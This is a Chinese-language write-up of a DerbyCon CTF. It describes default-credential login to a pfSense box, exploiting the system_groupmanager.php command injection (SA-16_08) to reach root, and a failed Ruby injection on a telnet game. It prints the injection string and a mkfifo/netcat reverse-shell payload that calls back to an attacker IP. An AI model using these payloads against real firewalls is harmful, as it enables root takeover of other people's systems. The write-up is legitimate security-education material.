### 密码破解尝试与权限提升

我们首先尝试使用默认用户名和密码（如`admin:pfsense`）进行登录，但未能成功。随后，我们将用户名更改为`pfsense`并尝试了相同的密码，最终获取了一些低分值的旗标。

初步看来，这个挑战似乎相对简单。然而，进一步探索发现，pfSense系统中存在一个名为`exec.php`的页面，允许调用系统命令并运行PHP代码。不幸的是，`pfsense`用户几乎没有任何权限，仅能访问少量页面，并通过widgets查看一些系统信息（包括版本号）以及上传文件。因此，在这台机器上获得shell的机会显得非常渺茫。

为了找到更多可访问的资源，我们决定抓取pfSense提供的所有页面目录列表。通过结合DirBuster工具自动化此过程，我们发现了两个返回HTTP 200 OK状态的页面：
- `index.php`：已知页面。
- `system_groupmanager.php`：新发现的页面。

浏览`system_groupmanager.php`后，我们找到了另一个更高分值的旗标。该页面负责管理组成员及其权限。尽管我们将用户添加到`admin`组，但并未改变界面或赋予更多权限。

经过数小时的努力，我们仍未找到任何漏洞。在检查源代码时，虽然没有直接发现漏洞，但我们注意到pfSense大量使用了`include`语句。于是，我们转向Google搜索“system_groupmanager.php exploit”，并在Rapid7数据库中找到了相关安全公告：
- [pfSense SA-16_08 WebGUI](https://www.rapid7.com/db/vulnerabilities/pfsense-sa-16_08-webgui)

根据公告描述，`system_groupmanager.php`中存在一个命令注入漏洞，允许具有相应权限的WebGUI用户以root身份执行命令。通过查看GitHub上的auth.inc历史记录，我们确定了受影响的代码行，并理解了其执行路径：
1. 数字用户ID提交给`/usr/local/www/system_groupmanager.php`中的代码。
2. 作为PHP数组传递给`/etc/inc/auth.inc`中的`local_group_set()`函数。
3. 使用`implode()`将数组转换为单个字符串，并用逗号连接。
4. 将结果传递给`mwexec()`函数，未进行任何转义或过滤，从而调用`/usr/sbin/pw`二进制程序。

为了利用此漏洞，我们需要正确转义字符串并插入合适的命令。最初，我们使用盲注技术并通过Wireshark监控流量确认命令执行情况。尽管我们在测试环境中遇到了一些问题，但在调整引号和转义序列后，以下命令成功执行：
```bash
0';/sbin/ping -c 1 172.16.71.10; /usr/bin/pw groupmod test -g 2003 -M '0
```

### 获取Shell

由于pfSense是FreeBSD的一个精简版本，不提供`wget`或`curl`等工具，我们选择了一个传统的Linux反向shell技术。参考PentestMonkey的反向shell技巧表（[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)），我们使用了以下命令：
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.16.71.10 12345 > /tmp/f
```

启动netcat监听器后，我们将上述命令作为参数的一部分执行：
```bash
0'; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.16.71.10 12345 > /tmp/f; /usr/sbin/pw groupmod test -g 2003 -M '0
```

通过将用户移动到特定组并保存操作来触发exploit，我们成功创建了一个反向连接，并捕获了位于`/root/flag.txt`中的最后一个旗标。最终，我们获得了5000分，并赢得了TrustedSec挑战硬币。

### 朝鲜战略导弹攻击计划

这个机器通过telnet提供了一个基于文本的游戏。起初我们认为挑战难度较高，但在与其他团队交流后得知，实际上并不难。游戏提供了帮助命令，显示各种游戏命令及公共/私有函数。我们怀疑可能存在Ruby命令注入漏洞。

我们手动尝试了几种注入方法，但需要一种自动化的方法。为此，我们使用`expect`生成了一个自定义脚本，用于自动执行任务。尽管尝试了多种注入技术，但均未成功。最终，我们未能解决这个问题。

### 自动化重利用

在CTF过程中，某些机器会定期重置，这意味着我们需要重新获取系统的访问权限。为了提高效率，我们编写了一些脚本来自动化这一过程。这种方法极大地节省了时间，提高了我们的竞争力。

### 总结

DerbyCon CTF是我们参加过的质量最高的比赛之一。每次参赛都能结识新朋友，希望下次比赛时也能见到你们！